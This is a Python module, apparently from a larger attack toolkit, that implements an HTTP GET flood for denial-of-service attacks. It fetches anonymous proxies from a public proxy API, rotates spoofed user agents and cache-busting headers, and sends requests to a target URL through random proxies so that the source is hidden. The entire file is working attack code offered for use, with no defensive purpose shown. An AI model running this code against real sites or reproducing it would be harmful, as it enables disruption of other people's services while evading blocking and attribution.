"""This module provides the flood function for an HTTP GET request DoS attack through proxies."""

import json
import random
import sys
import warnings
from typing import Dict, List

import requests
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

with open("tools/L7/user_agents.json", "r") as agents_file:
    user_agents = json.load(agents_file)["agents"]

def get_http_proxies() -> List[Dict[str, str]]:
    try:
        with requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            verify=False,
        ) as proxy_list:
            proxies = [
                {"http": proxy, "https": proxy}
                for proxy in proxy_list.text.split("\r\n")
                if proxy != ""
            ]

    except Timeout:
        print(
            f"\n{F.RED}[!] {F.CYAN}Failed to connect to the proxies!{F.RESET}"
        )
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}[!] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

proxies = get_http_proxies()
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str, proxies: List[Dict[str, str]]) -> None:
    global headers

    headers["User-Agent"] = random.choice(user_agents)

    try:
        proxy = random.choice(proxies)
        response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
    
    except (Timeout, OSError) as e:
        print(f"{F.RED}Error: {e}. Retrying...{F.RESET}")
        return

    else:
        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        payload_size = f"{F.RESET}Payload Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        proxy_addr = f"| {F.RESET}Proxy: {F.CYAN}{proxy['http']:>21}"
        print(f"{status} --> {payload_size} {proxy_addr}{F.RESET}")

        if not response.status_code:
            try:
                proxies.remove(proxy)
            except ValueError:
                proxies = get_http_proxies()

if __name__ == "__main__":
    target_url = "http://example.com"
    flood(target_url, proxies)
